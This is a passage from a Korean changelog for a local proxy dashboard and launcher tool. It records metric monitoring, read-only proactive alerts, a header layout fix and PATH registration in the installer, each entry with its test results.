| 프록시 자체 부하 모니터링 | `/api/metrics`에 프로세스 상태(pid·RSS·힙·이벤트 루프 지연 p50/p95/max)를 추가하고 대시보드 **프로세스 상태** 카드로 표시. 이벤트 루프 p95 ≥250ms·RSS ≥1.5GiB는 능동 경고. 지표 파일 기록을 **비동기**로 바꿔 이벤트 루프 블로킹 제거(close/exit는 동기 최종 flush) | 기능 추가 |
| 저장소 위생 | 추적되지 않던 `NUL` 잔여 파일 삭제 | 정리 |

검증: Node **722 pass / 0 fail**(DOM 97 포함), Python **690개 수집(11 skip)**. 변경 모듈(`test_launcher_arguments`·`test_route_cli`·`test_route_dashboard`·`test_handover_contract`·`test_launcher_scripts`) 통과, 이전 flaky였던 `ConnectionTest.test_reasons_through_shim`은 새 상한에서 21초에 통과.


## 13. 능동형 반응 (2026-11-01)

전체 소스를 다시 훑어 수동 확인에 의존하던 상태를 **읽기 전용 능동 반응**으로 보강했습니다.

| 항목 | 내용 | 상태 |
| --- | --- | --- |
| 서버 능동 점검 | 스냅샷마다 routing 기본값·설정된 서비스·실행 세션을 비교해 `기본 서비스 미설정`, `실행 서비스 선택 필요`, `세션 서비스 불일치`, `CLI 설정 변경됨`, `routing 설정 오류`를 배너로 산출. 재시작·설정 저장·제공자 호출 없음 | 기능 추가 |
| 탭 제목 배지 | 경고/심각 항목이 있으면 `⛔ n`/`⚠ n`을 제목 앞에 표시해 백그라운드 탭에서도 보이게 함 | 기능 추가 |
| 데스크톱 알림(옵트인) | 헤더 **알림** 버튼으로 권한을 허용한 경우에만 심각 항목을 1회 알림. 원인이 해소된 뒤 재발하면 다시 알림 | 기능 추가 |
| 연결 자동 복구 | `/api/snapshot` 실패 시 1·2·4·8·16초 지수 백오프로 재시도하고, 복구 시 토스트로 알림 | 기능 추가 |
| 보안 경계 | 능동 점검은 로컬 상태만 읽고 쓰기·세션 제어를 하지 않음. 알림 권한 거부 시에도 배너·배지는 동작 | 문서화 |

검증: Node **722 pass / 0 fail**(DOM 97 포함), Python **690개 수집(11 skip)**, 대시보드 모듈 262 pass. 라이브 대시보드에서 `proactive` 키·탭 배지·알림 버튼 서빙 확인.


## 14. 대시보드 헤더 레이아웃 (2026-11-01)

좁은 창에서 상단 내비게이션 글자가 버튼 안에서 줄바꿈(`대시보/드`, `설/정`)되고 액션 버튼과 겹치던 문제를 수정했습니다.

| 항목 | 내용 | 상태 |
| --- | --- | --- |
| 내비 라벨 줄바꿈 | `.nav-link`에 `white-space:nowrap`·`flex:0 0 auto` 적용 | 수정 |
| 1600px 이하 2행 | 브랜드+내비 1행, 액션(상태·알림·새로고침·도움말) 2행으로 분리. 720px 이하 기존 모바일 순서 유지 | 수정 |
| 넓은 창 | 1600px 초과에서는 한 행 유지(내비 4개 라벨 한 줄) | 확인 |

검증: 헤드리스 Edge 스크린샷 1087·1280·1500·1920px에서 라벨 줄바꿈 없음, 대시보드 모듈 262 pass.


## 15. 실행기 설치 자동화 (2026-11-01)

설치 후 `OpenClaude`가 인식되지 않는 문제를 줄이기 위해 설치 스크립트가 기본 설치 폴더를 **사용자 PATH에 자동 등록**하도록 했습니다.

| 항목 | 내용 | 상태 |
| --- | --- | --- |
| PATH 자동 등록 | 기본 대상(`%USERPROFILE%\.local\bin`)이 사용자 PATH에 없으면 추가. 현재 프로세스 PATH에도 반영하고 새 터미널 안내 | 수정 |
| 안전 경계 | 명시적 `-Target`에는 적용하지 않고 `-NoPath`로 끌 수 있음(테스트로 사용자 PATH 불변 확인) | 확인 |
| 문서 | `openClaude.ps1`이 아니라 `OpenClaude`(확장자 없이)·`OpenClaude.cmd`가 PATH 명령임을 README에 명시 | 문서 정정 |

검증: 설치 테스트 11 pass(사용자 PATH 불변 포함), Python **690개 수집(11 skip)**.
